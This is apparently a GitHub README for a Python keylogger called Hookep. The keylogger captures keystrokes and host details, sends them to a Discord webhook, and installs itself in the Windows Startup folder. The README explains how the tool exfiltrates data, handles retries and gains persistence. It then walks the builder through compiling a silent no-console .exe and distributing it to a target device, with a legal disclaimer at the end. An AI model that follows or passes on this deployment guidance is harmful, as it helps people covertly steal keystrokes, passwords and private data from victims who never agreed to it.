
# ⌨️ Hookep Keylogger (Discord Webhook Keylogger)

An advanced, high-performance asynchronous keystroke logger written in Python that formats, structures, and exfiltrates target system data directly to a Discord channel via Webhooks as JSON file attachments. This repository showcases real-world implementations of multi-threaded race condition prevention, automated local environment reconnaissance, and fault-tolerant network transmission layer design.

---

## ⚠️ CRITICAL WARNING: COMPILATION REQUIRED FOR DEPLOYMENT !!!
**THIS RAW UTILITY MUST BE COMPILED INTO A STANDALONE BINARY FILE (.EXE) BEFORE DISTRIBUTION !!! ATTEMPTING TO RUN THE RAW .PY SCRIPT DIRECTLY ON A TARGET DEVICE IS INVALID. COMPILATION EMBEDS ALL CORE INTERPRETERS AND EXTERNAL MODULES DIRECTLY INTO THE BINARY. ONCE COMPILED, THE TARGET MACHINE DOES NOT REQUIRE PYTHON INSTALLED AT ALL TO EXECUTE THE PAYLOAD !!!**

### ⚠️ Configuration Required
Before compiling the Python source code, you must insert your Discord Webhook URL into lines 155 and 156. Failure to set this will prevent the payload from exfiltrating data to your intended destination.

---

## 🚀 DEPENDENCY ANALYSIS & STABILITY !!!
While standard core components (`os`, `sys`, `json`, `socket`, `collections`, `datetime`, `threading`) are natively bundled inside Python's built-in standard library, this framework relies on external production wheels (`pynput` and `requests`) that must be explicitly fetched before initiating the compilation wrapper. The standalone tracking agent executes seamlessly across modern environment pipelines as long as these mandatory third-party dependencies are properly integrated at build time.

---

## 🔬 Core System Architecture & Logic

This tool operates on a decoupled, asynchronous multi-threaded architecture designed to keep input listening responsive while handling heavy data transportation logic in the background without causing interface lags or application hangs.

### 1. Host Reconnaissance & Metadata Gathering
Upon instantiation, the agent dynamically interrogates the host operating system to build a unique identifier matrix:
* Hostname Extraction: Uses the socket layer to fetch the local machine network name.
* Multi-Fallback Public IP Mapping: Iterates through three separate external public APIs to resolve the network's external WAN IP address. If an API fails or times out, it gracefully catches the error and drops to the next provider. If the host is completely offline, it fails safely by defaulting to localhost (127.0.0.1).

### 2. Thread-Safe Ring Buffering (Memory Safety)
To handle rapid key ingestion, the agent bypasses continuous disk writing or instant network calls:
* A thread-safe double-ended queue (collections.deque) is initialized with a strict maximum limit of 10,000 events to enforce a memory-safe ring buffer and eliminate data leaks.
* A threading.Lock mutual exclusion mechanism protects this queue. When the background transport worker reads the data, the main key listener thread is blocked from corrupting the batch state, entirely preventing memory-level race conditions.

### 3. Smart Input Processing & Layout Normalization
The input processor filters raw OS hooks captured via the pynput engine:
* Standard characters are cleanly stripped of internal module formatting and appended immediately.
* Critical structural control keys (such as backspaces, spaces, control strokes, and arrow movements) are intercepted, passed through an explicit translation dictionary, and transformed into highly readable structural text elements rather than messy module paths.

### 4. Asynchronous Transport Pipeline & Network Recovery Loop
Data delivery runs within an independent daemon background worker thread running a strict execution timeline:
* The background thread sleeps for a pre-configured flush interval (e.g., 10 minutes) while the listener catches input inputs.
* Upon waking up, the worker thread locks the buffer, pops all accumulated items sequentially, serializes the matrix into a structured JSON string, and generates a unique file attachment named after the target host and specific UNIX timestamp.
* The packet is shipped to the target Discord webhook containing an embedded system report message and the full JSON payload attachment.
* Extreme Network Resiliency: Driven by a custom requests Session object bound to a 5-step retry strategy with an aggressive backoff factor. If Discord hits the script with rate limits (HTTP 429) or the target network drops entirely, the agent catches the transport failure, reverses the current transmission data matrix, and re-injects the items right back into the front of the queue using the appendleft method. The data remains preserved in memory until stable internet access is fully restored.

### 5. Automated System Persistence Configuration
The persistence sub-routine executes conditionally based on compilation states:
* It analyzes sys.frozen runtime metadata to determine if the script is running in a development environment or as a standalone binary executables.
* If active as a binary, it resolves the absolute current execution path, scans system environment strings to locate the Windows hidden Roaming AppData path, and programmatically writes an automated execution script (.bat file) inside the native system Startup directory to execute the payload automatically on system boot.

---

## 🛠️ Deployment & Compilation Manual (Step-by-Step)

Follow this comprehensive workflow sequentially to configure, build, and deploy the application manually.

### Phase 1: Environment Preparation (Attacker / Builder Side Only)
If your active development machine lacks the required environment infrastructure:
1. Launch your standard desktop web browser tool and go directly to the official download server page at [python.org/downloads/](https://www.python.org/downloads/).
2. Fetch and deploy the standard stable execution installer tailored for your operating system.
3. **CRITICAL STEP:** During the installation sequence, you must check the box explicitly labeled **"Add Python to PATH"** before committing to the setup.

### Phase 2: Acquiring External Dependencies
Launch your system console interface (Command Prompt or PowerShell) and execute these exact configurations sequentially:

```text
# Step 1: Route your directory path straight into the folder holding the project assets
cd /path/to/your/project/folder

# Step 2: Fetch and mount the required operational packages and compilation engine
pip install pynput requests pyinstaller

```

### Phase 3: Binary Compilation Architecture

Ensure your target script asset is saved precisely as `Logger.py` within the active directory workspace. Invoke the optimization engine via the following command layout:

```text
# Execute the final compilation string to generate the payload asset
pyinstaller --onefile --noconsole Logger.py

```

* **`--onefile`**: Welds your entire code structure, dependencies, and the independent Python runtime components into a single standalone `.exe` asset.
* **`--noconsole`**: Forces the compiled application to execute silently as a background service, ensuring no visible terminal command prompt screen pops up on execution.

Once the compilation sequence finishes successfully, check your root workspace folder and open the newly populated `dist` subdirectory. Your operational tracking payload is fully assembled and accessible as `Logger.exe`.

---

## 📜 Developer Metadata

Hi there! I am Ahmet, known on GitHub as **Ahmetchimp**. I am a 12-year-old student, software engineer, and aspiring cybersecurity analyst focused heavily on low-level interaction, hardware tinkering, and offensive security infrastructure.

* **Development Timeline:** Began engineering at age 8 utilizing block-based Arduino frameworks and building games inside Scratch. Transitioned to lower-level Python foundations and HTML/Lua at age 10. Currently at age 12, I actively write code in low-level **C**, intermediate **Python**, build independent custom video games inside the standalone **LÖVE2D** framework, and research malware mechanics, reverse engineering, and RF signal hacking using custom microcontrollers.
* **Environment Preference:** Advanced Linux user. I currently daily-drive and micro-optimize performance-tuned Arch-based **CachyOS** setups for my developer pipeline.
* **Long-Term Mission:** My ultimate professional objective is to relocate to the United States to complete my university engineering degrees and establish an impactful career as an Ethical Hacker / Security Analyst inside major tech ecosystems.

---

## ⚠️ Compliance & Legal Disclaimer

**Strictly for Educational and Authorized Penetration Testing Studies.** This software architecture is designed and published exclusively for academic research, malware engineering analysis, and defensive security logging evaluation. Deploying automated logging tools, environment scanners, or persistence modifications onto hardware infrastructures without receiving explicit, written, prior administrative consent from the verified network owner is strictly illegal under international cyber-crime compliance policies. The author assumes absolutely zero accountability for system damage, malicious deployment actions, or legal implications resulting from the utilization of this code infrastructure.
